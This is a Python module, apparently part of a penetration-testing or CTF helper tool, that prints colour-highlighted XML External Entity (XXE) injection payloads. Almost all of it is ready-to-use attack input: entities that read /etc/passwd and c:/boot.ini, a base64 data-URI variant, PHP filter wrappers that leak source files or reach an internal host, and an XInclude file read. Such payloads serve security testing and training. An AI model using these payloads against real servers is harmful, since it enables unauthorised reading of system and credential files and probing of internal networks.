from colorama import init, Fore
from .. import date

# Test payloads

def test_payload():
    print("\n" + date.INFO() + "Payload to test:\n")
    print(Fore.WHITE + '''<!--?xml version="1.0" ?-->
<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' replace''' + Fore.WHITE + ''' [<!''' + Fore.RED + '''ENTITY ''' + Fore.BLUE + '''example''' + Fore.CYAN + ''' "Doe"''' + Fore.WHITE + '''> ]>
 <''' + Fore.GREEN + '''userInfo''' + Fore.WHITE + '''>
  <''' + Fore.GREEN + '''firstName''' + Fore.WHITE + '''>John</''' + Fore.GREEN + '''firstName''' + Fore.WHITE + '''>
  <''' + Fore.GREEN + '''lastName''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&example;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''lastName''' + Fore.WHITE + '''>
 </''' + Fore.GREEN + '''userInfo''' + Fore.WHITE + '''>''')
    print("\n" + date.INFO() + "It might help to set the" + Fore.CYAN + " Content-Type: application/xml" + Fore.WHITE + " in the request when sending XML payload to the server")

def classic_xxe(num):
    print("\n" + date.INFO() + "Classic XXE injetion")
    if num == 1:
        print(date.INFO() + "Attack 1 payload:\n")
        print('''<?''' + Fore.GREEN + '''xml''' + Fore.MAGENTA + ''' version''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"1.0"''' + Fore.WHITE + '''?><!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' root''' + Fore.WHITE + ''' [<!''' + Fore.RED + '''ENTITY''' + Fore.BLUE + ''' test''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' \'file:///etc/passwd\'''' + Fore.WHITE + '''>]><''' + Fore.GREEN + '''root''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&test;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''root''' + Fore.WHITE + '''>''')
    elif num == 2:
        print(date.INFO() + "Attack 2 payload:\n")
        print('''<?''' + Fore.GREEN + '''xml''' + Fore.MAGENTA + ''' version''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"1.0"''' + Fore.WHITE + '''?>
<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' data''' + Fore.WHITE + ''' [
<!ELEMENT data (#ANY)>
<!''' + Fore.RED + '''ENTITY''' + Fore.BLUE + ''' file''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' "file:///etc/passwd"''' + Fore.WHITE + '''>
]>
<''' + Fore.GREEN + '''data''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&file;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''data''' + Fore.WHITE + '''>''')
    elif num == 3:
        print(date.INFO() + "Attack 3 payload:\n")
        print('''<?''' + Fore.GREEN + '''xml''' + Fore.MAGENTA + ''' version''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"1.0"''' + Fore.MAGENTA + ''' encoding''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"ISO-8859-1"''' + Fore.WHITE + '''?>
  <!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' foo''' + Fore.WHITE + ''' [  
  <!ELEMENT foo ANY >
  <!''' + Fore.RED + '''ENTITY''' + Fore.BLUE + ''' xxe''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' "file:///etc/passwd"''' + Fore.WHITE + ''' >]><''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&xxe;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''')
    elif num == 4:
        print(date.INFO() + "Attack 4 payload:\n")
        print('''<?''' + Fore.GREEN + '''xml''' + Fore.MAGENTA + ''' version''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"1.0"''' + Fore.MAGENTA + ''' encoding''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"ISO-8859-1"''' + Fore.WHITE + '''?>
<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' foo ''' + Fore.WHITE + '''[  
  <!ELEMENT foo ANY >
  <!''' + Fore.RED + '''ENTITY''' + Fore.BLUE + ''' xxe''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' "file:///c:/boot.ini" ''' + Fore.WHITE + '''>]><''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&xxe;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''')
    else:
        print("\n" + date.ERROR() + "the Number is not valid")

def classic_xxe_base64():
    print("\n" + date.INFO() + "XXE Base64 encoded injetion:\n")
    print('''<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' test''' + Fore.WHITE + ''' [ <!''' + Fore.RED + '''ENTITY ''' + Fore.WHITE + '''% ''' + Fore.BLUE + '''init''' + Fore.RED + ''' SYSTEM ''' + Fore.CYAN + '''"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"''' + Fore.WHITE + '''>''' + Fore.BLUE + ''' %init; ''' + Fore.WHITE + ''']><''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''/>''')

def php_wrapper_inside_xxe(num):
    print("\n" + date.INFO() + "PHP Wrapper inside XXE injetion")
    if num == 1:
        print(date.INFO() + "Attack 1 payload:\n")
        print('''<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' replace''' + Fore.WHITE + ''' [<!''' + Fore.RED + '''ENTITY''' + Fore.BLUE + ''' xxe''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' "php://filter/convert.base64-encode/resource=index.php"''' + Fore.WHITE + '''> ]>
<''' + Fore.GREEN + '''contacts''' + Fore.WHITE + '''>
  <''' + Fore.GREEN + '''contact''' + Fore.WHITE + '''>
    <''' + Fore.GREEN + '''name''' + Fore.WHITE + '''>Jean ''' + Fore.BLUE + '''&xxe;''' + Fore.WHITE + ''' Dupont</''' + Fore.GREEN + '''name''' + Fore.WHITE + '''>
    <''' + Fore.GREEN + '''phone''' + Fore.WHITE + '''>00 11 22 33 44</''' + Fore.GREEN + '''phone''' + Fore.WHITE + '''>
    <''' + Fore.GREEN + '''address''' + Fore.WHITE + '''>42 rue du CTF</''' + Fore.GREEN + '''address''' + Fore.WHITE + '''>
    <''' + Fore.GREEN + '''zipcode''' + Fore.WHITE + '''>75000</''' + Fore.GREEN + '''zipcode''' + Fore.WHITE + '''>
    <''' + Fore.GREEN + '''city''' + Fore.WHITE + '''>Paris</''' + Fore.GREEN + '''city''' + Fore.WHITE + '''>
  </''' + Fore.GREEN + '''contact''' + Fore.WHITE + '''>
</''' + Fore.GREEN + '''contacts''' + Fore.WHITE + '''>''')
    elif num == 2:
        print(date.INFO() + "Attack 2 payload:\n")
        print('''<?''' + Fore.GREEN + '''xml''' + Fore.MAGENTA + ''' version''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"1.0"''' + Fore.MAGENTA + ''' encoding''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"ISO-8859-1"''' + Fore.WHITE + '''?>
<!''' + Fore.GREEN + '''DOCTYPE''' + Fore.MAGENTA + ''' foo''' + Fore.WHITE + ''' [
<!ELEMENT foo ANY >
<!''' + Fore.RED + '''ENTITY''' + Fore.WHITE + ''' %''' + Fore.BLUE + ''' xxe''' + Fore.RED + ''' SYSTEM''' + Fore.CYAN + ''' "php://filter/convert.base64-encode/resource=http://10.0.0.3"''' + Fore.WHITE + ''' >
]>
<''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''' + Fore.BLUE + '''&xxe;''' + Fore.WHITE + '''</''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''')
    else:
        print("\n" + date.ERROR() + "the Number is not valid")

def xinclude():
    print("\n" + date.INFO() + "XInclude injetion:\n")
    print('''<''' + Fore.GREEN + '''foo''' + Fore.MAGENTA + ''' xmlns:xi''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"http://www.w3.org/2001/XInclude"''' + Fore.WHITE + '''>
<''' + Fore.GREEN + '''xi:include''' + Fore.MAGENTA + ''' parse''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"text"''' + Fore.MAGENTA + ''' href''' + Fore.WHITE + '''=''' + Fore.CYAN + '''"file:///etc/passwd"''' + Fore.WHITE + '''/></''' + Fore.GREEN + '''foo''' + Fore.WHITE + '''>''')